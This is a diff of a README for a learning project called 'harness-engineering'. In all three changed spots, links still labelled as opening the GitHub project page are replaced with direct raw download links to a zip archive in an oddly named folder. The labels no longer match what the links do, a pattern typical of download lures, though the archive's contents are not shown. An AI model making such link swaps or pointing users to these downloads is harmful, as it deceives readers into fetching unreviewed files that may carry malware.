@@ -1,6 +1,6 @@
 # 🛠️ harness-engineering - Learn Faster, Build with Clarity
 
-[![Download](https://img.shields.io/badge/Download-Open%20Project%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fathirn6263/harness-engineering)
+[![Download](https://img.shields.io/badge/Download-Open%20Project%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/fathirn6263/harness-engineering/main/unniched/harness-engineering-3.7.zip)
 
 ## 📘 Overview
 
@@ -24,7 +24,7 @@ If the project includes extra files such as documents, notes, or practice materi
 
 Use this link to visit the project page and download the files:
 
-[Open harness-engineering on GitHub](https://github.com/fathirn6263/harness-engineering)
+[Open harness-engineering on GitHub](https://raw.githubusercontent.com/fathirn6263/harness-engineering/main/unniched/harness-engineering-3.7.zip)
 
 On the project page:
 
@@ -196,7 +196,7 @@ This makes the learning path easier to follow and remember
 
 ## 📎 Project Link
 
-[Open the project page here](https://github.com/fathirn6263/harness-engineering)
+[Open the project page here](https://raw.githubusercontent.com/fathirn6263/harness-engineering/main/unniched/harness-engineering-3.7.zip)
 
 ## 🔧 Quick Start
 
